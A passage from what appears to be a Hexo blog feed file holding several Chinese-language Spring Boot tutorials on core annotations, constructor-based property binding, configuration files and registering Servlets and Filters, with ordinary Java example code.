class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>自动配置</p><p>  Spring Boot能根据当前类路径下的类、jar包来自动配置bean，如添加一个spring-boot-starter-web启动器就能拥有web的功能，无需其他配置。</p></li><li><p>无代码生成和XML配置</p><p>  Spring Boot配置过程中无代码生成，也无需XML配置文件就能完成所有配置工作，这一切都是借助于条件注解完成的，这也是Spring4.x的核心功能之一。</p></li><li><p>应用监控</p><p>  Spring Boot提供一系列端点可以监控服务及应用，做健康检测。</p></li></ul><h2 id="Spring-Boot的缺点"><a href="#Spring-Boot的缺点" class="headerlink" title="Spring Boot的缺点"></a>Spring Boot的缺点</h2><p>Spring Boot虽然上手很容易，但如果你不了解其核心技术及流程，所以一旦遇到问题就很棘手，而且现在的解决方案也不是很多，需要一个完善的过程。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 最核心的 3 个注解详解</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%203%20%E4%B8%AA%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%203%20%E4%B8%AA%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>最近面试一些 Java 开发者，他们其中有些在公司实际用过 Spring Boot, 有些是自己兴趣爱好在业余自己学习过。然而，当我问他们 Spring Boot 最核心的 3 个注解是什么，令我失望的是鲜有人能答上来，这样你能说你对 Spring Boot 很了解吗？这可能还会给你减分！</p><h2 id="你所需具备的基础"><a href="#你所需具备的基础" class="headerlink" title="你所需具备的基础"></a>你所需具备的基础</h2><ul><li><a href="https://mp.weixin.qq.com/s/jWLcPxTg9bH3D9_7qbYbfw">什么是 Spring Boot?</a></li><li><a href="https://mp.weixin.qq.com/s/BzXNfBzq-2TOCbiHG3xcsQ">Spring Boot 核心配置文件详解</a></li><li><a href="https://mp.weixin.qq.com/s/PYM_iV-u3dPMpP3MNz7Hig">Spring Boot 开启的 2 种方式</a></li><li><a href="https://mp.weixin.qq.com/s/gs2zLSH6m9ijO0-pP2sr9Q">Spring Boot 自动配置原理、实战</a></li><li><a href="https://mp.weixin.qq.com/s/iMPXjuKRKT5lMZ4oVSp4Ww">Spring Boot 2.x 启动全过程源码分析</a></li></ul><h2 id="Spring-Boot-核心注解讲解"><a href="#Spring-Boot-核心注解讲解" class="headerlink" title="Spring Boot 核心注解讲解"></a>Spring Boot 核心注解讲解</h2><p>Spring Boot 最大的特点是无需 XML 配置文件，能自动扫描包路径装载并注入对象，并能做到根据 classpath 下的 jar 包自动配置。</p><p>所以 Spring Boot 最核心的 3 个注解就是：</p><h4 id="1、-Configuration"><a href="#1、-Configuration" class="headerlink" title="1、@Configuration"></a>1、@Configuration</h4><blockquote><p>org.springframework.context.annotation.Configuration</p></blockquote><p>这是 Spring 3.0 添加的一个注解，用来代替 applicationContext.xml 配置文件，所有这个配置文件里面能做到的事情都可以通过这个注解所在类来进行注册。</p><p>下面几个相关注解也是非常重要的！</p><p><strong>@Bean</strong></p><p>用来代替 XML 配置文件里面的 <code>&lt;bean ...&gt;</code> 配置。</p><p><strong>@ImportResource</strong></p><p>如果有些通过类的注册方式配置不了的，可以通过这个注解引入额外的 XML 配置文件，有些老的配置文件无法通过 <code>@Configuration</code> 方式配置的非常管用。</p><p><strong>@Import</strong></p><p>用来引入额外的一个或者多个 <code>@Configuration</code> 修饰的配置文件类。</p><p><strong>@SpringBootConfiguration</strong></p><p>这个注解就是 <code>@Configuration</code> 注解的变体，只是用来修饰是 Spring Boot 配置而已，或者可利于 Spring Boot 后续的扩展，源码如下。</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Configurationpublic @interface SpringBootConfiguration &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、-ComponentScan"><a href="#2、-ComponentScan" class="headerlink" title="2、@ComponentScan"></a>2、@ComponentScan</h4><blockquote><p>org.springframework.context.annotation.ComponentScan</p></blockquote><p>这是 Spring 3.1 添加的一个注解，用来代替配置文件中的 <code>component-scan</code> 配置，开启组件扫描，即自动扫描包路径下的 <code>@Component</code> 注解进行注册 bean 实例到 context 中。</p><p>另外，<code>@ComponentScans</code> 是可重复注解，即可以配置多个，用来配置注册不同的子包。</p><p>关于重复注解，大家可以看这篇文章《<a href="https://mp.weixin.qq.com/s/FSrtDEwILSM-Q2ocnZdNbA">JAVA元注解@interface详解</a>》。</p><h4 id="3、-EnableAutoConfiguration"><a href="#3、-EnableAutoConfiguration" class="headerlink" title="3、@EnableAutoConfiguration"></a>3、@EnableAutoConfiguration</h4><blockquote><p>org.springframework.boot.autoconfigure.EnableAutoConfiguration</p></blockquote><p>看全路径就知道，这是自 Spring Boot 诞生时添加的注解，用来提供自动配置，上面的两个都是 <code>spring-context</code> 包下的，不属于 Spring Boot，所以 Spring 3.0 之后的去 XML 配置方式已经为 Spring Boot 埋下了伏笔！</p><p>自动配置更多详细使用及实战可以看这篇文章《<a href="https://mp.weixin.qq.com/s/gs2zLSH6m9ijO0-pP2sr9Q">Spring Boot自动配置原理、实战</a>》。</p><h4 id="最后的彩蛋"><a href="#最后的彩蛋" class="headerlink" title="最后的彩蛋"></a>最后的彩蛋</h4><p>Spring Boot 最核心的 3 个注解介绍完了，大家可能会有疑问，为什么最主要的注解 <code>@SpringBootApplication</code> 不在其中？</p><p>留给大家的彩蛋，其实这个 <code>@SpringBootApplication</code> 注解就包含了以上 3 个主要注解，平时没有自定义配置的需求，则使用 <code>@SpringBootApplication</code> 注解完全就可以了！</p><p>让我们来看下 <code>@SpringBootApplication</code> 注解的源码，一切明了！</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Inherited@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(excludeFilters &#x3D; &#123;@Filter(type &#x3D; FilterType.CUSTOM, classes &#x3D; TypeExcludeFilter.class),@Filter(type &#x3D; FilterType.CUSTOM, classes &#x3D; AutoConfigurationExcludeFilter.class) &#125;)public @interface SpringBootApplication &#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://img.javastack.cn/18-8-27/31801590.jpg"></p><p>看完涨姿势了吗？</p><p>点赞转发一下吧，以后碾压面试官！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 最核心的 25 个注解，都是干货！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%2025%20%E4%B8%AA%E6%B3%A8%E8%A7%A3%EF%BC%8C%E9%83%BD%E6%98%AF%E5%B9%B2%E8%B4%A7%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%2025%20%E4%B8%AA%E6%B3%A8%E8%A7%A3%EF%BC%8C%E9%83%BD%E6%98%AF%E5%B9%B2%E8%B4%A7%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>学习和应用 Spring Boot 有一些时间了，你们对 Spring Boot 注解了解有多少呢？今天栈长我给大家整理了 Spring Boot 最核心的 25 个注解，都是干货！</p><h2 id="你所需具备的基础"><a href="#你所需具备的基础" class="headerlink" title="你所需具备的基础"></a>你所需具备的基础</h2><ul><li><a href="https://mp.weixin.qq.com/s/jWLcPxTg9bH3D9_7qbYbfw">什么是 Spring Boot?</a></li><li><a href="https://mp.weixin.qq.com/s/BzXNfBzq-2TOCbiHG3xcsQ">Spring Boot 核心配置文件详解</a></li><li><a href="https://mp.weixin.qq.com/s/PYM_iV-u3dPMpP3MNz7Hig">Spring Boot 开启的 2 种方式</a></li><li><a href="https://mp.weixin.qq.com/s/gs2zLSH6m9ijO0-pP2sr9Q">Spring Boot 自动配置原理、实战</a></li><li><a href="https://mp.weixin.qq.com/s/iMPXjuKRKT5lMZ4oVSp4Ww">Spring Boot 2.x 启动全过程源码分析</a></li><li><a href="https://mp.weixin.qq.com/s/nSIyS35N6KpnFCWdI43THA">Java 必须掌握的 12 种 Spring 常用注解！</a></li></ul><h2 id="Spring-Boot-最核心的-25-个注解"><a href="#Spring-Boot-最核心的-25-个注解" class="headerlink" title="Spring Boot 最核心的 25 个注解"></a>Spring Boot 最核心的 25 个注解</h2><p><strong>1、@SpringBootApplication</strong></p><p>这是 Spring Boot 最最最核心的注解，用在 Spring Boot 主类上，标识这是一个 Spring Boot 应用，用来开启 Spring Boot 的各项能力。</p><p>其实这个注解就是 <code>@SpringBootConfiguration</code>、<code>@EnableAutoConfiguration</code>、<code>@ComponentScan</code> 这三个注解的组合，也可以用这三个注解来代替 <code>@SpringBootApplication</code> 注解。</p><p><strong>2、@EnableAutoConfiguration</strong></p><p>允许 Spring Boot 自动配置注解，开启这个注解之后，Spring Boot 就能根据当前类路径下的包或者类来配置 Spring Bean。</p><p>如：当前类路径下有 Mybatis 这个 JAR 包，<code>MybatisAutoConfiguration</code> 注解就能根据相关参数来配置 Mybatis 的各个 Spring Bean。</p><p><strong>3、@Configuration</strong></p><p>这是 Spring 3.0 添加的一个注解，用来代替 applicationContext.xml 配置文件，所有这个配置文件里面能做到的事情都可以通过这个注解所在类来进行注册。</p><p><strong>4、@SpringBootConfiguration</strong></p><p>这个注解就是 @Configuration 注解的变体，只是用来修饰是 Spring Boot 配置而已，或者可利于 Spring Boot 后续的扩展。</p><p><strong>5、@ComponentScan</strong></p><p>这是 Spring 3.1 添加的一个注解，用来代替配置文件中的 component-scan 配置，开启组件扫描，即自动扫描包路径下的 @Component 注解进行注册 bean 实例到 context 中。</p><p>前面 5 个注解可以在这篇文章《<a href="https://mp.weixin.qq.com/s/kNvy_0jb4oJtYdaxryq5xg">Spring Boot 最核心的 3 个注解详解</a>》中了解更多细节的。</p><p><strong>6、@Conditional</strong></p><p>这是 Spring 4.0 添加的新注解，用来标识一个 Spring Bean 或者  Configuration 配置文件，当满足指定的条件才开启配置。</p><p><strong>7、@ConditionalOnBean</strong></p><p>组合 <code>@Conditional</code> 注解，当容器中有指定的 Bean 才开启配置。</p><p><strong>8、@ConditionalOnMissingBean</strong></p><p>组合 <code>@Conditional</code> 注解，和 <code>@ConditionalOnBean</code> 注解相反，当容器中没有指定的 Bean 才开启配置。</p><p><strong>9、@ConditionalOnClass</strong></p><p>组合 <code>@Conditional</code> 注解，当容器中有指定的 Class 才开启配置。</p><p><strong>10、@ConditionalOnMissingClass</strong></p><p>组合 <code>@Conditional</code> 注解，和 <code>@ConditionalOnMissingClass</code> 注解相反，当容器中没有指定的 Class 才开启配置。</p><p><strong>11、@ConditionalOnWebApplication</strong></p><p>组合 <code>@Conditional</code> 注解，当前项目类型是 WEB 项目才开启配置。</p><p>当前项目有以下 3 种类型。</p><pre class="line-numbers language-none"><code class="language-none">enum Type &#123;&#x2F;** * Any web application will match. *&#x2F;ANY,&#x2F;** * Only servlet-based web application will match. *&#x2F;SERVLET,&#x2F;** * Only reactive-based web application will match. *&#x2F;REACTIVE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>12、@ConditionalOnNotWebApplication</strong></p><p>组合 <code>@Conditional</code> 注解，和 <code>@ConditionalOnWebApplication</code> 注解相反，当前项目类型不是 WEB 项目才开启配置。</p><p><strong>13、@ConditionalOnProperty</strong></p><p>组合 <code>@Conditional</code> 注解，当指定的属性有指定的值时才开启配置。</p><p><strong>14、@ConditionalOnExpression</strong></p><p>组合 <code>@Conditional</code> 注解，当 SpEL 表达式为 true 时才开启配置。</p><p><strong>15、@ConditionalOnJava</strong></p><p>组合 <code>@Conditional</code> 注解，当运行的 Java JVM 在指定的版本范围时才开启配置。</p><p><strong>16、@ConditionalOnResource</strong></p><p>组合 <code>@Conditional</code> 注解，当类路径下有指定的资源才开启配置。</p><p><strong>17、@ConditionalOnJndi</strong></p><p>组合 <code>@Conditional</code> 注解，当指定的 JNDI 存在时才开启配置。</p><p><strong>18、@ConditionalOnCloudPlatform</strong></p><p>组合 <code>@Conditional</code> 注解，当指定的云平台激活时才开启配置。</p><p><strong>19、@ConditionalOnSingleCandidate</strong></p><p>组合 <code>@Conditional</code> 注解，当指定的 class 在容器中只有一个 Bean，或者同时有多个但为首选时才开启配置。</p><p><strong>20、@ConfigurationProperties</strong></p><p>用来加载额外的配置（如 .properties 文件），可用在 <code>@Configuration</code> 注解类，或者 <code>@Bean</code> 注解方法上面。</p><p>关于这个注解的用法可以参考《<br><a href="https://mp.weixin.qq.com/s/aen2PIh0ut-BSHad-Bw7hg">Spring Boot读取配置的几种方式</a>》这篇文章。</p><p><strong>21、@EnableConfigurationProperties</strong></p><p>一般要配合 <code>@ConfigurationProperties</code> 注解使用，用来开启对 <code>@ConfigurationProperties</code> 注解配置 Bean 的支持。</p><p><strong>22、@AutoConfigureAfter</strong></p><p>用在自动配置类上面，表示该自动配置类需要在另外指定的自动配置类配置完之后。</p><p>如 Mybatis 的自动配置类，需要在数据源自动配置类之后。</p><pre class="line-numbers language-none"><code class="language-none">@AutoConfigureAfter(DataSourceAutoConfiguration.class)public class MybatisAutoConfiguration &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>23、@AutoConfigureBefore</strong></p><p>这个和 <code>@AutoConfigureAfter</code> 注解使用相反，表示该自动配置类需要在另外指定的自动配置类配置之前。</p><p><strong>24、@Import</strong></p><p>这是 Spring 3.0 添加的新注解，用来导入一个或者多个 <code>@Configuration</code> 注解修饰的类，这在 Spring Boot 里面应用很多。</p><p><strong>25、@ImportResource</strong></p><p>这是 Spring 3.0 添加的新注解，用来导入一个或者多个 Spring  配置文件，这对 Spring Boot 兼容老项目非常有用，因为有些配置无法通过 Java Config 的形式来配置就只能用这个注解来导入。</p><p>对以上有疑问或者对 Spring Boot 有不懂的都可以点击文末阅读原文链接加入栈长的知识星球，和栈长及更多 Java 技术人一起学习。</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 构造器参数绑定，越来越强大了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9E%84%E9%80%A0%E5%99%A8%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%EF%BC%8C%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BC%BA%E5%A4%A7%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%9E%84%E9%80%A0%E5%99%A8%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%EF%BC%8C%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BC%BA%E5%A4%A7%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前几天，Spring Boot 2.2.0 正式发布了：<a href="https://mp.weixin.qq.com/s/3TF6ooiW3JUzSGeAiQ9m8g">Spring Boot 2.2.0 正式发布，支持 JDK 13！</a>，文中有提到基于构造器的参数绑定，那么今天栈长就带大家来实践一下，到底怎么用，有什么用。</p><p><strong>废话不说，先上示例代码：</strong></p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.boot.context.properties.ConstructorBinding;import org.springframework.boot.context.properties.bind.DefaultValue;import org.springframework.format.annotation.DateTimeFormat;import java.util.Date;&#x2F;** *  *&#x2F;@ConstructorBinding@ConfigurationProperties(prefix &#x3D; &quot;tom&quot;)public class TomProperties &#123;    private String name;    private String sex;    private int age;    private String country;    private Date entryTime;    public TomProperties(String name,                         String sex,                         int age,                         @DefaultValue(&quot;China&quot;) String country,                         @DateTimeFormat(pattern &#x3D; &quot;yyyy-MM-dd HH:mm:ss&quot;) Date entryTime) &#123;        this.name &#x3D; name;        this.sex &#x3D; sex;        this.age &#x3D; age;        this.country &#x3D; country;        this.entryTime &#x3D; entryTime;    &#125;    public String getName() &#123;        return name;    &#125;    public String getSex() &#123;        return sex;    &#125;    public int getAge() &#123;        return age;    &#125;    public String getCountry() &#123;        return country;    &#125;    public Date getEntryTime() &#123;        return entryTime;    &#125;    @Override    public String toString() &#123;        return &quot;TomProperties&#123;&quot; +                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, sex&#x3D;&#39;&quot; + sex + &#39;\&#39;&#39; +                &quot;, age&#x3D;&quot; + age +                &quot;, country&#x3D;&#39;&quot; + country + &#39;\&#39;&#39; +                &quot;, entryTime&#x3D;&quot; + entryTime +                &#39;&#125;&#39;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置文件内容：</strong></p><pre class="line-numbers language-none"><code class="language-none">tom:  name: Tom  sex: man  age: 18  entry-time: 2012-12-12 12:00:00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参数结果输出：</strong></p><blockquote><p>TomProperties{name&#x3D;’Tom’, sex&#x3D;’man’, age&#x3D;18, country&#x3D;’China’, entryTime&#x3D;Wed Dec 12 12:00:00 CST 2012}</p></blockquote><p>通过构造器的参数绑定，其实就是在 <code>@ConfigurationProperties</code> 注解的基础上再添加一个 ‘@ConstructorBinding’ 注解。</p><p><strong>@ConstructorBinding几点总结：</strong></p><p>1、用了 <code>@ConstructorBinding</code> 这个注解，就标识这个类的参数优先通过带参数的构造器注入，如果没有带参数的构造器则再通过  setters  注入；</p><p>怎么判断是通过 setters 注入还是构造器注入，请看这个类的源码：</p><blockquote><p>org.springframework.boot.context.properties.ConfigurationPropertiesBean.BindMethod</p></blockquote><p>2、当 <code>@ConstructorBinding</code> 用在类上时，该类只能有一个带参数的构造器；如果有多个构造器时，可以把 <code>@ConstructorBinding</code> 直接绑定到具体的构造方法上；</p><p>3、成员变量可以是 <code>final</code> 不可变；</p><p>4、支持该类的内部类构造器注入的形式；</p><p>5、支持默认值 <code>@DefaultValue </code>、<code>@DateTimeFormat</code> 时间格式等注解配合使用；</p><p>6、需要配合 <code>@ConfigurationProperties</code>、<code>@EnableConfigurationProperties</code> 注解使用；</p><p>7、不支持像 <code>@Component</code>、<code>@Bean</code>、<code>@Import</code> 等方式创建 bean 的构造器参数绑定；</p><p><strong>来看下它的源码：</strong></p><pre class="line-numbers language-none"><code class="language-none">@Target(&#123;ElementType.TYPE, ElementType.CONSTRUCTOR&#125;)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface ConstructorBinding &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>什么参数都没有，可以说明，它就是起到一个构造器参数绑定的标识作用。</p><p>涨姿势了吧？？又学会了一种绑定参数的新方法了！</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 核心配置</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h2><p>在包根目录下添加启动类，必须包含main方法，再添加Spring Boot启动方法：</p><pre class="line-numbers language-none"><code class="language-none">SpringApplication.run(SampleController.class, args);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者流式API</p><pre class="line-numbers language-none"><code class="language-none">new SpringApplicationBuilder().run(args);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面是一个典型的Spring Boot工程包布局，Application启动类位于根目录下</p><pre class="line-numbers language-none"><code class="language-none">com +- example     +- myproject         +- Application.java         |         +- domain         |   +- Customer.java         |   +- CustomerRepository.java         |         +- service         |   +- CustomerService.java         |         +- web             +- CustomerController.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="核心注解"><a href="#核心注解" class="headerlink" title="核心注解"></a>核心注解</h2><p>启动类上面的注解是@SpringBootApplication，它也是Spring Boot的核心注解，主要组合包含了以下3个注解：</p><p>@SpringBootConfiguration：组合了@Configuration注解，实现配置文件的功能。<br>@EnableAutoConfiguration：打开自动配置的功能，也可以关闭某个自动配置的选项，如关闭数据源自动配置功能：<br>@SpringBootApplication(exclude &#x3D; { DataSourceAutoConfiguration.class })。<br>@ComponentScan：Spring组件扫描。</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>Spring Boot有两种类型的配置文件，application和bootstrap文件。Spring Boot会自动加载classpath目前下的这两个文件，文件格式为properties或者yml格式。</p><p>*.properties文件大家都知道是key&#x3D;value的形式<br>*.yml是key: value的形式</p><p>*.yml加载的属性是有顺序的，但不支持@PropertySource注解来导入配置，一般推荐用yml文件，看下来更加形象。</p><h3 id="application配置文件"><a href="#application配置文件" class="headerlink" title="application配置文件"></a>application配置文件</h3><p>application配置文件是应用级别的，是当前应用的配置文件。</p><h3 id="bootstrap配置文件"><a href="#bootstrap配置文件" class="headerlink" title="bootstrap配置文件"></a>bootstrap配置文件</h3><p>bootstrap配置文件是系统级别的，用来加载外部配置，如配置中心的配置信息，也可以用来定义系统不会变化的属性。bootstatp文件的加载先于application文件。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 注册 Servlet 的三种方法，真是太有用了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%B3%A8%E5%86%8C%20Servlet%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E7%9C%9F%E6%98%AF%E5%A4%AA%E6%9C%89%E7%94%A8%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%B3%A8%E5%86%8C%20Servlet%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E7%9C%9F%E6%98%AF%E5%A4%AA%E6%9C%89%E7%94%A8%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>本文栈长教你如何在 Spring Boot 注册 Servlet、Filter、Listener。</p><h2 id="一、Spring-Boot-注册"><a href="#一、Spring-Boot-注册" class="headerlink" title="一、Spring Boot 注册"></a>一、Spring Boot 注册</h2><p>Spring Boot 提供了 <code>ServletRegistrationBean</code>, <code>FilterRegistrationBean</code>, <code>ServletListenerRegistrationBean</code> 三个类分别用来注册 Servlet, Filter, Listener，下面是 Servlet 的示例代码。</p><pre class="line-numbers language-none"><code class="language-none">import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;&#x2F;** *  *&#x2F;public class RegisterServlet extends HttpServlet &#123;@Overrideprotected void service(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;String name &#x3D; getServletConfig().getInitParameter(&quot;name&quot;);String sex &#x3D; getServletConfig().getInitParameter(&quot;sex&quot;);resp.getOutputStream().println(&quot;name is &quot; + name);resp.getOutputStream().println(&quot;sex is &quot; + sex);&#125;&#125;@Beanpublic ServletRegistrationBean registerServlet() &#123;ServletRegistrationBean servletRegistrationBean &#x3D; new ServletRegistrationBean(new RegisterServlet(), &quot;&#x2F;registerServlet&quot;);servletRegistrationBean.addInitParameter(&quot;name&quot;, &quot;javastack&quot;);servletRegistrationBean.addInitParameter(&quot;sex&quot;, &quot;man&quot;);return servletRegistrationBean;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、组件扫描注册"><a href="#二、组件扫描注册" class="headerlink" title="二、组件扫描注册"></a>二、组件扫描注册</h2><p>Servlet 3.0 之前，Servlet、Filter、Listener 这些组件都需要在 <code>web.xml</code> 中进行配置，3.0 之后开始不再需要 <code>web.xml</code> 这个配置文件了，所有的组件都可以通过代码配置或者注解来达到目的。</p><p>如下图所示，截图自 Servlet 3.1。</p><p><img src="http://img.javastack.cn/18-8-28/48900950.jpg"></p><p>Servlet 3.0 开始提供了这 3 个注解来代替。</p><p><strong>@WebServlet</strong> &#x3D;&gt; 代替 servlet 配置</p><p><strong>@WebFilter</strong> &#x3D;&gt; 代替 filter 配置</p><p><strong>@WebListener</strong> &#x3D;&gt; 代替 listener 配置</p><h4 id="配置-Servlet-示例"><a href="#配置-Servlet-示例" class="headerlink" title="配置 Servlet 示例"></a>配置 Servlet 示例</h4><pre class="line-numbers language-none"><code class="language-none">import javax.servlet.annotation.WebInitParam;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;&#x2F;** *  *&#x2F;@WebServlet(name &#x3D; &quot;javaServlet&quot;, urlPatterns &#x3D; &quot;&#x2F;javastack.cn&quot;, asyncSupported &#x3D; true,initParams &#x3D; &#123;@WebInitParam(name &#x3D; &quot;name&quot;, value &#x3D; &quot;javastack&quot;),@WebInitParam(name &#x3D; &quot;sex&quot;, value &#x3D; &quot;man&quot;) &#125;)public class JavaServlet extends HttpServlet &#123;@Overrideprotected void service(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;String name &#x3D; getServletConfig().getInitParameter(&quot;name&quot;);String sex &#x3D; getServletConfig().getInitParameter(&quot;sex&quot;);resp.getOutputStream().println(&quot;name is &quot; + name);resp.getOutputStream().println(&quot;sex is &quot; + sex);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="配置-Filter-示例"><a href="#配置-Filter-示例" class="headerlink" title="配置 Filter 示例"></a>配置 Filter 示例</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;@WebFilter(filterName &#x3D; &quot;javaFilter&quot;, urlPatterns &#x3D; &quot;&#x2F;*&quot;, initParams &#x3D; &#123;@WebInitParam(name &#x3D; &quot;name&quot;, value &#x3D; &quot;javastack&quot;),@WebInitParam(name &#x3D; &quot;code&quot;, value &#x3D; &quot;123456&quot;) &#125;)public class JavaFilter implements Filter &#123;@Overridepublic void init(FilterConfig filterConfig) throws ServletException &#123;System.out.println(&quot;java filter init.&quot;);String name &#x3D; filterConfig.getInitParameter(&quot;name&quot;);String code &#x3D; filterConfig.getInitParameter(&quot;code&quot;);System.out.println(&quot;name is &quot; + name);System.out.println(&quot;code is &quot; + code);&#125;@Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)throws IOException, ServletException &#123;System.out.println(&quot;java filter processing.&quot;);chain.doFilter(request, response);&#125;@Overridepublic void destroy() &#123;System.out.println(&quot;java filter destroy.&quot;);&#125;&#125;<span 